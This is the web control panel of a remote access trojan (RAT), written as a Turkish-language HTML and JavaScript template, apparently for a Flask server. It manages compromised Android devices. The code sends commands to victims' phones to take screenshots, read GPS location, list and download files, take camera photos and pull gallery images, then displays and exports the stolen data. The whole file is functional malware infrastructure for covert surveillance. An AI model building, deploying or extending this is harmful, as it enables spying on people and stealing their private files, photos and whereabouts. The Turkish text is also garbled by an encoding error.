<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RAT Server Control Panel</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
</head>
<body>
    <div class="container">
        <header>
            <h1>ğŸ”§ RAT Server Control Panel</h1>
            <div class="server-status">
                <span class="status-indicator online"></span>
                <span>Server Online</span>
            </div>
        </header>

        <div class="dashboard">
            <div class="card">
                <h2>ğŸ“Š Server Ä°statistikleri</h2>
                <div class="stats">
                    <div class="stat-item">
                        <span class="stat-label">BaÄŸlÄ± Cihazlar:</span>
                        <span class="stat-value" id="connected-count">0</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">Server Portu:</span>
                        <span class="stat-value">8080</span>
                    </div>
                    <div class="stat-item">
                        <span class="stat-label">Durum:</span>
                        <span class="stat-value status-running">Ã‡alÄ±ÅŸÄ±yor</span>
                    </div>
                </div>
            </div>

            <div class="card">
                <h2>ğŸ“± BaÄŸlÄ± Cihazlar</h2>
                <div class="client-list" id="client-list">
                    <p class="no-clients">HenÃ¼z baÄŸlÄ± cihaz yok</p>
                </div>
            </div>

            <div class="card">
                <h2>ğŸ® Komut Paneli</h2>
                <div class="command-section">
                    <div class="client-selector">
                        <label for="selected-client">Hedef Cihaz:</label>
                        <select id="selected-client">
                            <option value="">Cihaz seÃ§in</option>
                        </select>
                    </div>
                    
                    <div class="command-buttons">
                        <button class="btn btn-primary" onclick="takeScreenshot()">
                            ğŸ“¸ Ekran GÃ¶rÃ¼ntÃ¼sÃ¼ Al
                        </button>
                        <button class="btn btn-success" onclick="getLocation()">
                            ğŸ“ Konum Bilgisi Al
                        </button>
                        <button class="btn btn-info" onclick="listFiles()">
                            ğŸ“ DosyalarÄ± Listele
                        </button>
                        <button class="btn btn-photo" onclick="capturePhoto()">
                            ğŸ“· FotoÄŸraf Ã‡ek
                        </button>
                        <button class="btn btn-gallery" onclick="getGallery()">
                            ğŸ–¼ï¸ Galeri GÃ¶ster
                        </button>
                        <button class="btn btn-warning" onclick="refreshClients()">
                            ğŸ”„ CihazlarÄ± Yenile
                        </button>
                    </div>
                </div>
            </div>

            <div class="card results-card">
                <h2>ğŸ“‹ Komut SonuÃ§larÄ± & Detaylar</h2>
                <div class="results-controls">
                    <button class="btn btn-secondary" onclick="clearResults()">ğŸ—‘ï¸ Temizle</button>
                    <button class="btn btn-secondary" onclick="exportResults()">ğŸ’¾ Export</button>
                </div>
                <div class="results-area">
                    <div id="results-content">
                        <p class="no-results">HenÃ¼z komut Ã§alÄ±ÅŸtÄ±rÄ±lmadÄ±</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        const socket = io();
        let clients = {};

        socket.on('connect', function() {
            console.log('Admin panel connected to server');
            refreshClients();
        });

        socket.on('screenshot_result', function(data) {
            console.log('Screenshot result received:', data);
            showResult('screenshot', data);
        });

        socket.on('location_result', function(data) {
            console.log('Location result received:', data);
            showResult('location', data);
        });

        socket.on('file_list_result', function(data) {
            console.log('File list result received:', data);
            showResult('files', data);
        });

        socket.on('file_download_result', function(data) {
            console.log('File download result received:', data);
            showResult('download', data);
        });

        socket.on('photo_result', function(data) {
            console.log('Photo result received:', data);
            showResult('photo', data);
        });

        socket.on('gallery_photos_result', function(data) {
            console.log('Gallery photos result received:', data);
            showResult('gallery', data);
        });

        function refreshClients() {
            fetch('/clients')
                .then(response => response.json())
                .then(data => {
                    clients = data;
                    updateClientList();
                    updateClientSelector();
                    updateStats();
                })
                .catch(error => {
                    console.error('Error fetching clients:', error);
                });
        }

        function updateClientList() {
            const clientList = document.getElementById('client-list');
            if (Object.keys(clients).length === 0) {
                clientList.innerHTML = '<p class="no-clients">HenÃ¼z baÄŸlÄ± cihaz yok</p>';
                return;
            }

            let html = '';
            for (const [clientId, client] of Object.entries(clients)) {
                html += `
                    <div class="client-item">
                        <div class="client-info">
                            <strong>ID:</strong> ${clientId.substring(0, 8)}...
                            <br>
                            <strong>BaÄŸlantÄ±:</strong> ${new Date(client.connected_at).toLocaleString()}
                        </div>
                        <div class="client-status">
                            <span class="status-indicator online"></span>
                            Online
                        </div>
                    </div>
                `;
            }
            clientList.innerHTML = html;
        }

        function updateClientSelector() {
            const selector = document.getElementById('selected-client');
            selector.innerHTML = '<option value="">Cihaz seÃ§in</option>';
            
            for (const [clientId, client] of Object.entries(clients)) {
                const option = document.createElement('option');
                option.value = clientId;
                option.textContent = `${clientId.substring(0, 8)}... (${new Date(client.connected_at).toLocaleString()})`;
                selector.appendChild(option);
            }
        }

        function updateStats() {
            document.getElementById('connected-count').textContent = Object.keys(clients).length;
        }

        function getSelectedClient() {
            const selectedClient = document.getElementById('selected-client').value;
            if (!selectedClient) {
                alert('LÃ¼tfen bir cihaz seÃ§in');
                return null;
            }
            return selectedClient;
        }

        function takeScreenshot() {
            const clientId = getSelectedClient();
            if (!clientId) return;

            fetch('/send_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    client_id: clientId,
                    command: 'screenshot'
                })
            })
            .then(response => response.json())
            .then(data => {
                showResult('command', { message: 'Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ komutu gÃ¶nderildi' });
            })
            .catch(error => {
                showResult('error', { message: 'Komut gÃ¶nderilirken hata oluÅŸtu' });
            });
        }

        function getLocation() {
            const clientId = getSelectedClient();
            if (!clientId) return;

            fetch('/send_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    client_id: clientId,
                    command: 'location'
                })
            })
            .then(response => response.json())
            .then(data => {
                showResult('command', { message: 'Konum bilgisi komutu gÃ¶nderildi' });
            })
            .catch(error => {
                showResult('error', { message: 'Komut gÃ¶nderilirken hata oluÅŸtu' });
            });
        }

        function listFiles() {
            const clientId = getSelectedClient();
            if (!clientId) return;

            fetch('/send_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    client_id: clientId,
                    command: 'list_files',
                    path: '/storage/emulated/0/'
                })
            })
            .then(response => response.json())
            .then(data => {
                showResult('command', { message: 'Dosya listesi komutu gÃ¶nderildi' });
            })
            .catch(error => {
                showResult('error', { message: 'Komut gÃ¶nderilirken hata oluÅŸtu' });
            });
        }

        function capturePhoto() {
            const clientId = getSelectedClient();
            if (!clientId) return;

            fetch('/send_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    client_id: clientId,
                    command: 'capture_photo'
                })
            })
            .then(response => response.json())
            .then(data => {
                showResult('command', { message: 'FotoÄŸraf Ã§ekme komutu gÃ¶nderildi' });
            })
            .catch(error => {
                showResult('error', { message: 'Komut gÃ¶nderilirken hata oluÅŸtu' });
            });
        }

        function getGallery() {
            const clientId = getSelectedClient();
            if (!clientId) return;

            fetch('/send_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    client_id: clientId,
                    command: 'get_gallery'
                })
            })
            .then(response => response.json())
            .then(data => {
                showResult('command', { message: 'Galeri fotoÄŸraflarÄ± komutu gÃ¶nderildi' });
            })
            .catch(error => {
                showResult('error', { message: 'Komut gÃ¶nderilirken hata oluÅŸtu' });
            });
        }

        function showResult(type, data) {
            const resultsContent = document.getElementById('results-content');
            const timestamp = new Date().toLocaleTimeString();
            const clientId = document.getElementById('selected-client').value;
            const clientName = clientId ? clientId.substring(0, 8) + '...' : 'Bilinmeyen';
            
            let html = `<div class="result-item ${type}" data-type="${type}">`;
            html += `<div class="result-header">
                        <span class="result-time">${timestamp}</span>
                        <span class="result-type">${type.toUpperCase()}</span>
                        <span class="result-client">ğŸ“± ${clientName}</span>
                        <button class="toggle-details" onclick="toggleDetails(this)">ğŸ‘ï¸ Detaylar</button>
                     </div>`;
            
            if (type === 'screenshot' && data.image_data) {
                html += `<div class="result-summary">
                            <span class="result-icon">ğŸ“¸</span>
                            <span>Ekran gÃ¶rÃ¼ntÃ¼sÃ¼ alÄ±ndÄ±</span>
                         </div>`;
                html += `<div class="result-details">
                            <div class="screenshot-container">
                                <img src="data:image/png;base64,${data.image_data}" alt="Screenshot" class="screenshot-img" onclick="openImageModal(this)">
                                <div class="screenshot-info">
                                    <p>ğŸ“ Boyut: ${Math.round(data.image_data.length * 0.75 / 1024)} KB</p>
                                    <p>ğŸ• Ã‡ekim zamanÄ±: ${timestamp}</p>
                                </div>
                            </div>
                         </div>`;
            } else if (type === 'location' && (data.latitude || data.error)) {
                const hasValidLocation = data.latitude && data.latitude !== 0;
                const isError = data.error || !hasValidLocation;
                
                html += `<div class="result-summary">
                            <span class="result-icon">${isError ? 'âŒ' : 'ğŸ“'}</span>
                            <span>${isError ? 'Konum alÄ±namadÄ±' : 'Konum bilgisi alÄ±ndÄ±'}</span>
                         </div>`;
                html += `<div class="result-details">
                            <div class="location-info">`;
                
                if (isError) {
                    html += `<div class="location-error">
                                <p><strong>âŒ Hata:</strong> ${data.error || 'Konum servisi kapalÄ± veya izin verilmemiÅŸ'}</p>
                                <p><strong>ğŸ’¡ Ã‡Ã¶zÃ¼m Ã¶nerileri:</strong></p>
                                <ul>
                                    <li>Cihazda GPS/Konum servisini aÃ§Ä±n</li>
                                    <li>Uygulamaya konum izni verin</li>
                                    <li>CihazÄ± aÃ§Ä±k alanda test edin</li>
                                    <li>Google Play Services gÃ¼ncel mi kontrol edin</li>
                                </ul>
                             </div>`;
                } else {
                    html += `<div class="location-coords">
                                <p><strong>ğŸ“ Enlem:</strong> ${data.latitude}</p>
                                <p><strong>ğŸ“ Boylam:</strong> ${data.longitude}</p>
                                <p><strong>ğŸ¯ Hassasiyet:</strong> ${data.accuracy || 'Bilinmiyor'} metre</p>
                                ${data.note ? `<p><strong>â„¹ï¸ Not:</strong> ${data.note}</p>` : ''}
                             </div>
                             <div class="location-map">
                                <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d1000!2d${data.longitude}!3d${data.latitude}!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x0%3A0x0!2zM!5e0!3m2!1str!2str!4v1234567890" 
                                        width="100%" height="300" style="border:0;" allowfullscreen="" loading="lazy"></iframe>
                             </div>
                             <div class="location-actions">
                                <button class="btn btn-mini" onclick="copyCoordinates('${data.latitude}', '${data.longitude}')">ğŸ“‹ KoordinatlarÄ± Kopyala</button>
                                <button class="btn btn-mini" onclick="openInMaps('${data.latitude}', '${data.longitude}')">ğŸ—ºï¸ Haritalarda AÃ§</button>
                             </div>`;
                }
                
                html += `       </div>
                         </div>`;
            } else if (type === 'files' && data.files) {
                const fileCount = data.files.length;
                const folders = data.files.filter(f => f.is_directory).length;
                const files = fileCount - folders;
                
                html += `<div class="result-summary">
                            <span class="result-icon">ğŸ“</span>
                            <span>${fileCount} Ã¶ÄŸe listelendi (${files} dosya, ${folders} klasÃ¶r)</span>
                         </div>`;
                html += `<div class="result-details">
                            <div class="files-container">
                                <div class="files-stats">
                                    <div class="stat-card">
                                        <span class="stat-number">${fileCount}</span>
                                        <span class="stat-label">Toplam Ã–ÄŸe</span>
                                    </div>
                                    <div class="stat-card">
                                        <span class="stat-number">${files}</span>
                                        <span class="stat-label">Dosya</span>
                                    </div>
                                    <div class="stat-card">
                                        <span class="stat-number">${folders}</span>
                                        <span class="stat-label">KlasÃ¶r</span>
                                    </div>
                                </div>
                                <div class="files-search">
                                    <input type="text" placeholder="Dosya ara..." onkeyup="searchFiles(this, '${Date.now()}')">
                                </div>
                                <div class="files-list" id="files-list-${Date.now()}">`;
                
                data.files.forEach((file, index) => {
                    const isFolder = file.is_directory;
                    const fileName = file.name;
                    const fileSize = file.size ? formatFileSize(file.size) : '-';
                    const icon = isFolder ? 'ğŸ“' : getFileIcon(fileName);
                    const fileType = isFolder ? 'KlasÃ¶r' : getFileType(fileName);
                    
                    html += `<div class="file-item ${isFolder ? 'folder' : 'file'}">
                                <span class="file-icon">${icon}</span>
                                <div class="file-info">
                                    <span class="file-name">${fileName}</span>
                                    <span class="file-size">${fileSize}</span>
                                </div>
                                <span class="file-type">${fileType}</span>
                                <button class="btn btn-mini" onclick="downloadFile('${file.path}')">â¬‡ï¸</button>
                             </div>`;
                });
                
                html += `       </div>
                            </div>
                         </div>`;
            } else if (type === 'download' && data.file_data) {
                html += `<div class="result-summary">
                            <span class="result-icon">â¬‡ï¸</span>
                            <span>Dosya indirildi: ${data.filename}</span>
                         </div>`;
                html += `<div class="result-details">
                            <div class="download-info">
                                <p><strong>ğŸ“„ Dosya AdÄ±:</strong> ${data.filename}</p>
                                <p><strong>ğŸ“ Boyut:</strong> ${Math.round(data.file_data.length * 0.75 / 1024)} KB</p>
                                <button class="btn btn-success" onclick="downloadToDevice('${data.filename}', '${data.file_data}')">ğŸ’¾ Bilgisayara Ä°ndir</button>
                            </div>
                         </div>`;
            } else if (type === 'photo' && data.error) {
                html += `<div class="result-summary">
                            <span class="result-icon">ğŸ“·</span>
                            <span>FotoÄŸraf Ã§ekme yanÄ±tÄ±</span>
                         </div>`;
                html += `<div class="result-details">
                            <div class="photo-error">
                                <p><strong>âŒ Bilgi:</strong> ${data.error}</p>
                                <p><strong>ğŸ’¡ Ã–neri:</strong> ${data.suggestion || 'Galeri fotoÄŸraflarÄ±nÄ± gÃ¶rÃ¼ntÃ¼lemek iÃ§in "Galeri GÃ¶ster" butonunu kullanÄ±n'}</p>
                            </div>
                         </div>`;
            } else if (type === 'gallery' && data.photos) {
                const photoCount = data.photos.length;
                html += `<div class="result-summary">
                            <span class="result-icon">ğŸ–¼ï¸</span>
                            <span>${photoCount} fotoÄŸraf bulundu</span>
                         </div>`;
                html += `<div class="result-details">
                            <div class="gallery-container">
                                <div class="gallery-stats">
                                    <p><strong>ğŸ“Š Toplam FotoÄŸraf:</strong> ${photoCount}</p>
                                    <p><strong>â„¹ï¸ Not:</strong> Son 5 fotoÄŸraf gÃ¶steriliyor</p>
                                </div>
                                <div class="gallery-grid">`;
                
                data.photos.forEach((photo, index) => {
                    const fileSize = Math.round(photo.data.length * 0.75 / 1024);
                    const dateAdded = new Date(photo.date_added * 1000).toLocaleString();
                    
                    html += `<div class="gallery-item">
                                <div class="gallery-image">
                                    <img src="data:image/jpeg;base64,${photo.data}" alt="${photo.name}" onclick="openImageModal(this)">
                                </div>
                                <div class="gallery-info">
                                    <p class="photo-name">${photo.name}</p>
                                    <p class="photo-size">${fileSize} KB</p>
                                    <p class="photo-date">${dateAdded}</p>
                                    <div class="photo-actions">
                                        <button class="btn btn-mini" onclick="downloadPhotoToDevice('${photo.name}', '${photo.data}')">ğŸ’¾ Ä°ndir</button>
                                        <button class="btn btn-mini" onclick="copyPhotoInfo('${photo.name}', '${photo.path}')">ğŸ“‹ Bilgi</button>
                                    </div>
                                </div>
                             </div>`;
                });
                
                html += `       </div>
                            </div>
                         </div>`;
            } else {
                html += `<div class="result-summary">
                            <span class="result-icon">ğŸ’¬</span>
                            <span>${data.message || 'Komut yanÄ±tÄ±'}</span>
                         </div>`;
                html += `<div class="result-details">
                            <div class="json-container">
                                <pre class="json-content">${JSON.stringify(data, null, 2)}</pre>
                            </div>
                         </div>`;
            }
            
            html += `</div>`;
            
            if (resultsContent.innerHTML.includes('no-results')) {
                resultsContent.innerHTML = html;
            } else {
                resultsContent.innerHTML = html + resultsContent.innerHTML;
            }
        }

        function toggleDetails(button) {
            const resultItem = button.closest('.result-item');
            const details = resultItem.querySelector('.result-details');
            
            if (details.style.display === 'none' || !details.style.display) {
                details.style.display = 'block';
                button.innerHTML = 'ğŸ‘ï¸ Gizle';
                button.classList.add('active');
            } else {
                details.style.display = 'none';
                button.innerHTML = 'ğŸ‘ï¸ Detaylar';
                button.classList.remove('active');
            }
        }

        function getFileIcon(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            const icons = {
                'jpg': 'ğŸ–¼ï¸', 'jpeg': 'ğŸ–¼ï¸', 'png': 'ğŸ–¼ï¸', 'gif': 'ğŸ–¼ï¸',
                'mp4': 'ğŸ¬', 'avi': 'ğŸ¬', 'mov': 'ğŸ¬',
                'mp3': 'ğŸµ', 'wav': 'ğŸµ', 'flac': 'ğŸµ',
                'pdf': 'ğŸ“„', 'doc': 'ğŸ“„', 'docx': 'ğŸ“„',
                'txt': 'ğŸ“', 'log': 'ğŸ“',
                'apk': 'ğŸ“¦', 'zip': 'ğŸ“¦', 'rar': 'ğŸ“¦',
                'exe': 'âš™ï¸', 'msi': 'âš™ï¸'
            };
            return icons[ext] || 'ğŸ“„';
        }

        function getFileType(filename) {
            const ext = filename.split('.').pop().toLowerCase();
            const types = {
                'jpg': 'GÃ¶rsel', 'jpeg': 'GÃ¶rsel', 'png': 'GÃ¶rsel', 'gif': 'GÃ¶rsel',
                'mp4': 'Video', 'avi': 'Video', 'mov': 'Video',
                'mp3': 'Ses', 'wav': 'Ses', 'flac': 'Ses',
                'pdf': 'Belge', 'doc': 'Belge', 'docx': 'Belge',
                'txt': 'Metin', 'log': 'Log',
                'apk': 'Uygulama', 'zip': 'ArÅŸiv', 'rar': 'ArÅŸiv'
            };
            return types[ext] || 'Dosya';
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function searchFiles(input, listId) {
            const searchTerm = input.value.toLowerCase();
            const filesList = document.getElementById('files-list-' + listId);
            const items = filesList.querySelectorAll('.file-item');
            
            items.forEach(item => {
                const fileName = item.querySelector('.file-name').textContent.toLowerCase();
                if (fileName.includes(searchTerm)) {
                    item.style.display = 'flex';
                } else {
                    item.style.display = 'none';
                }
            });
        }

        function copyCoordinates(lat, lon) {
            navigator.clipboard.writeText(`${lat}, ${lon}`);
            alert('Koordinatlar kopyalandÄ±!');
        }

        function openInMaps(lat, lon) {
            window.open(`https://www.google.com/maps?q=${lat},${lon}`, '_blank');
        }

        function openImageModal(img) {
            const modal = document.createElement('div');
            modal.className = 'image-modal';
            modal.innerHTML = `
                <div class="modal-content">
                    <span class="close" onclick="this.parentElement.parentElement.remove()">&times;</span>
                    <img src="${img.src}" alt="Screenshot" class="modal-image">
                </div>
            `;
            document.body.appendChild(modal);
        }

        function downloadFile(filename) {
            const clientId = getSelectedClient();
            if (!clientId) return;

            fetch('/send_command', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    client_id: clientId,
                    command: 'download_file',
                    filepath: filename
                })
            })
            .then(response => response.json())
            .then(data => {
                showResult('command', { message: `"${filename}" dosyasÄ± indiriliyor...` });
            });
        }

        function clearResults() {
            if (confirm('TÃ¼m sonuÃ§larÄ± temizlemek istediÄŸinizden emin misiniz?')) {
                document.getElementById('results-content').innerHTML = '<p class="no-results">HenÃ¼z komut Ã§alÄ±ÅŸtÄ±rÄ±lmadÄ±</p>';
            }
        }

        function exportResults() {
            const results = document.getElementById('results-content').innerHTML;
            const blob = new Blob([results], { type: 'text/html' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `rat_results_${new Date().toISOString().split('T')[0]}.html`;
            a.click();
            URL.revokeObjectURL(url);
        }

        function downloadToDevice(filename, fileData) {
            try {
                const byteCharacters = atob(fileData);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray]);
                
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                a.click();
                URL.revokeObjectURL(url);
            } catch (error) {
                console.error('Download error:', error);
                alert('Dosya indirilirken hata oluÅŸtu');
            }
        }

        function downloadPhotoToDevice(filename, imageData) {
            try {
                const byteCharacters = atob(imageData);
                const byteNumbers = new Array(byteCharacters.length);
                for (let i = 0; i < byteCharacters.length; i++) {
                    byteNumbers[i] = byteCharacters.charCodeAt(i);
                }
                const byteArray = new Uint8Array(byteNumbers);
                const blob = new Blob([byteArray], { type: 'image/jpeg' });
                
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = filename;
                a.click();
                URL.revokeObjectURL(url);
            } catch (error) {
                console.error('Photo download error:', error);
                alert('FotoÄŸraf indirilirken hata oluÅŸtu');
            }
        }

        function copyPhotoInfo(name, path) {
            const info = `FotoÄŸraf AdÄ±: ${name}\nDosya Yolu: ${path}`;
            navigator.clipboard.writeText(info).then(() => {
                alert('FotoÄŸraf bilgileri kopyalandÄ±!');
            }).catch(err => {
                console.error('Copy error:', err);
                alert('Kopyalama sÄ±rasÄ±nda hata oluÅŸtu');
            });
        }

        // Sayfa yÃ¼klendiÄŸinde cihazlarÄ± yenile
        setInterval(refreshClients, 15000); // 15 saniye
        refreshClients();
        
        // Sayfa yenilendiÄŸinde de cihazlarÄ± yenile
        window.addEventListener('beforeunload', function() {
            refreshClients();
        });
    </script>
</body>
</html>